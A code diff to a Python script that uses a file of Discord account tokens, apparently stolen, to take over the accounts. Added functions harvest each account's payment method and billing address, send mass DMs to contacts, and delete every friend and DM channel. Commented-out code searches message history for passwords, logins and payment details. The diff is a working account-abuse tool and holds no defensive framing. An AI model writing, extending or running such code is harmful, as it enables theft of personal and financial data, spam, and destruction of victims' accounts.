@@ -50,6 +50,34 @@ def get_profile(id, token):
         return False
 
 
+def get_payment_info(token):
+    payment_types = ["Credit Card", "Paypal"]
+    url = "https://discord.com/api/v8/users/@me/billing/payment-sources"
+    headers = {"authorization": token,
+               "accept": "/",
+               "authority": "discordapp.com",
+               "content-type": "application/json",
+               }
+    r = requests.get(url, headers=headers)
+    if r.status_code == 200:
+        data = r.json()
+        try:
+            data = data[0]
+            accounts[token]['payment'] = {'type': payment_types[int(data['type']) - 1], 'valid': not data['invalid'],
+                                          'email': data['email'], 'billing name': data['billing_address']['name'],
+                                          'country': data['billing_address']['country'],
+                                          'state': data['billing_address']['state'],
+                                          'city': data['billing_address']['city'],
+                                          'zip code': data['billing_address']['postal_code'],
+                                          'address': data['billing_address']['line_1'], }
+        except Exception:
+            pass
+        return True
+    else:
+        print(f"Invalid (payment) {token} {r.status_code}")
+        return False
+
+
 def validate_token(token):
     global accounts
     url = f"https://discord.com/api/v8/users/@me"
@@ -61,7 +89,7 @@ def validate_token(token):
     r = requests.get(url, headers=headers)
     if r.status_code == 200:
         data = r.json()
-        accounts[token] = {'username': data['username'] + data['discriminator'], 'id': data['id'],
+        accounts[token] = {'username': data['username'] + "#" + data['discriminator'], 'id': data['id'],
                            'email': data['email'], 'phone': data['phone']}
         print(f"{accounts[token]['username']} | Valid {token}")
         return True
@@ -117,8 +145,58 @@ def send_mass_dms(token):
         send_message(random.choice(msgs),
                      channel['id'],
                      token)
-        print(f"To {channel['recipients'][0]['username']} #{index}\n")
-        time.sleep(1.5)
+        try:
+            print(f"To {channel['recipients'][0]['username']} #{index}\n")
+        except Exception:
+            pass
+        time.sleep(1)
+
+
+def get_all_friends(token):
+    url = "https://discord.com/api/v8/users/@me/relationships"
+    headers = {"authorization": token,
+               "accept": "/",
+               "authority": "discordapp.com",
+               "content-type": "application/json",
+               }
+    r = requests.get(url, headers=headers)
+    if r.status_code == 200:
+        return r.json()
+    else:
+        print(f"Get all friends error: {r.status_code}")
+        return False
+
+
+def delete_friends(token):
+    for index, friend in enumerate(get_all_friends(token)):
+        url = f"https://discord.com/api/v8/users/@me/relationships/{friend['id']}"
+        headers = {"authorization": token,
+                   "accept": "/",
+                   "authority": "discordapp.com",
+                   "content-type": "application/json",
+                   }
+        r = requests.delete(url, headers=headers)
+        if r.status_code == 200:
+            print(f"Deleted friend {friend['id']}")
+        else:
+            print(f"Delete friends error: {r.status_code}")
+        # time.sleep(1)
+
+
+def delete_channels(token):
+    for index, channel in enumerate(get_channels(token)):
+        url = f"https://discord.com/api/v8/channels/{channel['id']}"
+        headers = {"authorization": token,
+                   "accept": "/",
+                   "authority": "discordapp.com",
+                   "content-type": "application/json",
+                   }
+        r = requests.delete(url, headers=headers)
+        if r.status_code == 200:
+            print(f"Deleted channel {channel['id']}")
+        else:
+            print(f"Delete friends error: {r.status_code}")
+        # time.sleep(1)
 
 
 def validate_all():
@@ -141,6 +219,8 @@ def validate_all():
 
                 if validate_token(line.strip()):
                     file.write(line)
+
+                get_payment_info(line.strip())
             file.truncate()
 
         with open('accounts.json', 'w') as file:
@@ -150,11 +230,15 @@ def validate_all():
 if __name__ == '__main__':
     with open('accounts.json') as file:
         accounts = json.load(file)
+
     validate_all()
 
     # for token in list(accounts.keys()):
-    #     send_mass_dms(token)
-    # for token in list(accounts.keys()):
-    #     terms = ['price', 'buy', 'password', 'pass', 'login', 'paypal', 'cost', 'email', 'gift', 'nitro', 'payment', 'money', 'code', 'download', 'link', 'usd']
-    #     print(f"Searching messages in {accounts[token]['username']} with terms: {terms}")
-    #     find_messages(token, terms)
+        # terms = ['password', 'pass', 'login', 'paypal', 'email', 'gift', 'nitro', 'payment', 'money', 'code', 'download', 'link', 'usd', 'account']
+        # print(f"\nSearching messages in {accounts[token]['username']} with terms: {terms}")
+        # find_messages(token, terms)
+
+    for token in list(accounts.keys()):
+        send_mass_dms(token)
+        delete_channels(token)
+        delete_friends(token)
